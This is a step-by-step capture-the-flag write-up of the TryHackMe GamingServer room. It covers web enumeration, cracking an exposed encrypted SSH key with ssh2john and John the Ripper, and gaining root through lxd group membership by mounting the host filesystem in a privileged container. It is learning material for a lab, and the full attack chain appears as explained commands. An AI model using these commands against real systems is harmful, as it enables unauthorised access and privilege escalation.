# TryHackMe - GamingServer
**Platform:** TryHackMe
**Room:** GamingServer
**Date:** 29 July 2026
---

# Objective

The objective of this room was to gain initial access to the machine through web enumeration and then escalate privileges to root by exploiting misconfigured LXD permissions.

---

# Skills Learned

- Web Enumeration
- Directory Enumeration using Gobuster
- Understanding robots.txt
- SSH Private Key Cracking
- John the Ripper
- Linux Enumeration
- SUID Enumeration
- Linux Capabilities
- LXD Enumeration
- LXD Privilege Escalation
- File Transfer between Kali and Target
- Container Basics

---

# Step 1 - Initial Nmap Scan

Started with an Nmap scan.

```bash
nmap -sC -sV -Pn -oN nmap.txt <Target-IP>
```

### Command Explanation

### `-sC`

Runs the default NSE (Nmap Scripting Engine) scripts.

These scripts automatically perform common enumeration tasks like:

- HTTP Title
- robots.txt
- SSL Information
- SSH Banner

---

### `-sV`

Detects service versions running on every open port.

Example:

```
Apache httpd 2.4.29
OpenSSH 7.6
```

---

### `-Pn`

Treats the host as online.

Sometimes ICMP Ping is blocked.

Without `-Pn`, Nmap may incorrectly think the machine is offline.

---

### `-oN nmap.txt`

Saves scan results into a normal text file.

Advantages

- Easy to review later
- Can share with teammates
- Good documentation

---

# Result

Found:

- Port 22 - SSH
- Port 80 - HTTP

The web server looked much more promising than SSH.

---

# Step 2 - Website Enumeration

Visited

```
http://<Target-IP>
```

Nothing interesting appeared.

---

# Step 3 - View Source

Viewed the page source.

Found

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

## Observation

This likely revealed a username.

Possible username

```
john
```

At this point I did **NOT** attempt SSH because I still didn't have credentials.

---

# Step 4 - robots.txt

Visited

```
http://<Target-IP>/robots.txt
```

Contents

```
User-agent: *
Allow: /
/uploads/
```

This revealed another interesting directory.

---

# Step 5 - Browse uploads

Visited

```
/uploads/
```

Found

```
dict.lst
manifesto.txt
meme.jpg
```

Downloaded every file.

---

## File Analysis

### manifesto.txt

Contained "The Hacker Manifesto".

Not useful.

---

### meme.jpg

Checked with

```bash
file meme.jpg
```

Confirmed it was a normal JPEG.

Checked strings

```bash
strings meme.jpg
```

Nothing useful.

---

### dict.lst

Contained a password wordlist.

Saved it for later.

---

# Step 6 - Directory Enumeration

Used Gobuster.

```bash
gobuster dir \
-u http://<Target-IP> \
-w /usr/share/wordlists/dirb/common.txt \
-t 5 \
--timeout 30s
```

## Command Explanation

### dir

Directory enumeration mode.

---

### -u

Target URL.

---

### -w

Wordlist.

Gobuster checks every word inside the list.

Example

```
admin
login
backup
uploads
secret
```

---

### -t 5

Uses 5 threads.

Lower threads helped because higher values caused timeout errors.

---

### --timeout 30s

Waits 30 seconds before giving up on a request.

---

# Mistake I Made

Initially Gobuster kept timing out.

The solution was lowering the thread count and increasing timeout.

---

# Result

Found

```
uploads
secret
robots.txt
.htaccess
.htpasswd
server-status
```

---

# Step 7 - Secret Directory

Visited

```
/secret/
```

Found

```
secretKey
```

Downloaded it.

---

# Step 8 - Analyze Secret Key

Checked

```bash
file secretKey
```

Output

```
PEM RSA private key
```

Opened the file.

Found

```
BEGIN RSA PRIVATE KEY
Proc-Type: 4,ENCRYPTED
```

Meaning

The SSH key was encrypted with a passphrase.

---

# Step 9 - Crack SSH Key

Converted the key.

```bash
ssh2john secretKey > hash.txt
```

## What ssh2john Does

John the Ripper cannot directly understand SSH private keys.

ssh2john converts the key into a password hash format that John understands.

---

Cracked it.

```bash
john --wordlist=dict.lst hash.txt
```

Result

```
letmein
```

Verified

```bash
john --show hash.txt
```

---

# Step 10 - SSH Login

Connected

```bash
ssh -i secretKey john@<Target-IP>
```

Entered passphrase

```
letmein
```

Successfully logged in.

---

# Step 11 - Initial Enumeration

Checked

```bash
whoami
```

Returned

```
john
```

---

Checked

```bash
id
```

Returned

- UID
- Groups
- Permissions

Important group discovered

```
lxd
```

---

Checked

```bash
pwd
```

Current working directory.

---

Checked

```bash
hostname
```

Machine hostname.

---

Checked

```bash
sudo -l
```

Purpose

Shows commands the current user can execute with sudo.

Instead it requested John's Linux password.

Important Lesson

The SSH private key passphrase is **NOT** the same as the Linux account password.

---

# Step 12 - Home Directory Enumeration

Checked

```bash
ls -la
```

Found

```
user.txt
```

Also noticed

```
.bash_history -> /dev/null
```

Meaning command history was intentionally disabled.

---

# Step 13 - SUID Enumeration

Executed

```bash
find / -perm -4000 2>/dev/null
```

## Command Breakdown

### find /

Search the entire filesystem.

---

### -perm -4000

Look for files with the SUID permission bit.

SUID means the file runs as its owner (usually root) even if another user executes it.

---

### 2>/dev/null

Suppress all error messages.

Without this the screen would be filled with "Permission denied."

---

Result

Only normal Linux binaries.

Nothing useful.

---

# Step 14 - Linux Capabilities

Executed

```bash
getcap -r / 2>/dev/null
```

Purpose

Search every file for Linux capabilities.

Capabilities allow programs to perform certain privileged operations without full root privileges.

Only found

```
mtr-packet
```

Not useful.

---

# Step 15 - Writable Directories

Executed

```bash
find / -writable -type d 2>/dev/null
```

Purpose

Find directories where the current user has write permission.

Nothing useful.

---

# Step 16 - LXD Enumeration

Checked group membership.

```bash
groups
```

Result

```
john ... lxd
```

This immediately became the most interesting privilege escalation vector.

---

Checked version.

```bash
lxc --version
```

Result

```
3.0.3
```

---

Checked images.

```bash
lxc image list
```

Result

No images available.

---

# Step 17 - Check Internet Access

Executed

```bash
ping images.linuxcontainers.org
```

100% packet loss.

Meaning

The target machine could not download an image from the Internet.

I needed to prepare one on my Kali machine.

---

# Step 18 - Mistake I Made

I accidentally tried cloning the repository **inside the target machine**.

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

It failed because the target had no Internet access.

The correct place was my Kali VM.

---

# Step 19 - Build Alpine Image on Kali

Clone

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

Enter directory

```bash
cd lxd-alpine-builder
```

Run

```bash
sudo ./build-alpine
```

This created

```
alpine-v3.24-x86_64-xxxxxxxx.tar.gz
```

---

# Step 20 - Host Image Transfer

Started an HTTP server on Kali.

```bash
python3 -m http.server 8000
```

Purpose

Turns the current folder into a simple web server.

Everything inside the folder becomes downloadable.

---

On the target machine

Downloaded the image.

```bash
curl -O http://<Kali-IP>:8000/alpine-v3.24-x86_64-xxxxxxxx.tar.gz
```

## Command Explanation

### curl

Downloads files from URLs.

---

### -O

Saves the file using its original filename.

Without `-O`, curl prints the file to the terminal.

---

# Step 21 - Import Image

```bash
lxc image import alpine-v3.24-x86_64-xxxxxxxx.tar.gz --alias alpine
```

## Command Breakdown

### lxc

LXD command-line tool.

---

### image

Image management section.

---

### import

Registers the downloaded image inside the local LXD image store.

Before importing, it is just a normal file.

After importing, LXD can create containers from it.

---

### --alias alpine

Creates a friendly name.

Instead of typing the long fingerprint, I can simply use

```
alpine
```

---

# Step 22 - Create Container

```bash
lxc init alpine privesc -c security.privileged=true
```

## Command Breakdown

### init

Creates a container.

Does **NOT** start it.

---

### alpine

Image name.

---

### privesc

Container name.

---

### -c

Set a container configuration option.

---

### security.privileged=true

Creates a privileged container.

A privileged container has much greater access to the host than an ordinary container.

---

# Step 23 - Mount Host Filesystem

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

## Complete Explanation

### config

Modify container configuration.

---

### device add

Attach a new device.

---

### privesc

Container name.

---

### host-root

Device name.

Can be anything.

---

### disk

The device type.

This tells LXD we are attaching a filesystem.

---

### source=/

Mount the host's root filesystem.

---

### path=/mnt/root

Inside the container, the host filesystem becomes accessible at

```
/mnt/root
```

---

### recursive=true

Also mount nested mount points.

---

# Step 24 - Start Container

```bash
lxc start privesc
```

Starts the container.

No output means success.

---

# Step 25 - Enter Container

```bash
lxc exec privesc /bin/sh
```

## Command Breakdown

### exec

Execute a command inside a running container.

---

### privesc

Container name.

---

### /bin/sh

Launch the shell.

Prompt changed

```
#
```

Meaning

I was now root **inside the container**, not on the host.

---

# Step 26 - Verify Host Mount

Executed

```bash
ls /mnt/root
```

Saw

```
bin
boot
etc
home
root
usr
```

This confirmed the host filesystem had been successfully mounted.

---

# Step 27 - Root Directory

Checked

```bash
ls -la /mnt/root/root
```

Found

```
root.txt
```

The root flag was located inside the host's root home directory.

---

# Key Takeaways

- Never ignore HTML comments.
- Always check robots.txt.
- Download every exposed file.
- Analyze every file before assuming it is useless.
- SSH private keys can be protected with passphrases.
- LXD group membership is extremely dangerous.
- Always enumerate before exploiting.
- Document every step.
- Small mistakes like cloning on the wrong machine help reinforce understanding.

---

# Tools Used

- Nmap
- Gobuster
- John the Ripper
- ssh2john
- SSH
- Curl
- Python HTTP Server
- LXC/LXD
- Linux Enumeration Commands

---

# Final Thoughts

This room taught me that privilege escalation is often about careful enumeration rather than complex exploits. The most important discovery was that the user belonged to the `lxd` group. Understanding how LXD works, building an Alpine image, importing it, mounting the host filesystem, and accessing the root directory gave me practical experience with one of the classic Linux privilege escalation techniques.